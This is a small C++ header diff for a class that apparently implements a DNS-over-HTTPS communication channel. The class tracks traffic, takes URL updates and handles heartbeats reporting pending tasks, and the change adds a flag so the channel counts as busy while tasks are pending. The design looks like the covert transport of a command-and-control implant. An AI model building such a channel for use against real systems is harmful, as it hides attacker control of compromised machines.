@@ -100,7 +100,8 @@ public:
     ULONG GetLastUpTotal() const { return lastUpTotal; }
     ULONG GetLastDownTotal() const { return lastDownTotal; }
     void  ResetTrafficTotals() { lastUpTotal = 0; lastDownTotal = 0; }
-    BOOL  IsBusy() const { return (downBuf != NULL); }
+    // IsBusy: TRUE if we're in the middle of a multi-chunk download OR heartbeat indicated pending tasks
+    BOOL  IsBusy() const { return (downBuf != NULL) || hasPendingTasks; }
     ULONG GetDownAckOffset() const { return downAckOffset; }
 
     BOOL  WasLastQueryOk() const { return lastQueryOk; }
@@ -109,6 +110,7 @@ public:
     void        UpdateUrls(BYTE* urls);
 
 private:
+    BOOL  hasPendingTasks = FALSE; // Set when heartbeat says "has tasks" but GET hasn't completed yet
     BOOL  DohQueryTxt(const CHAR* qname, BYTE* outBuf, ULONG outBufSize, ULONG* outSize);
     BOOL  DohQueryA(const CHAR* qname, BYTE* outBuf, ULONG outBufSize, ULONG* outSize);
     BOOL  PerformHttpRequest(const CHAR* qname, USHORT qtype, BYTE** outData, ULONG* outLen);
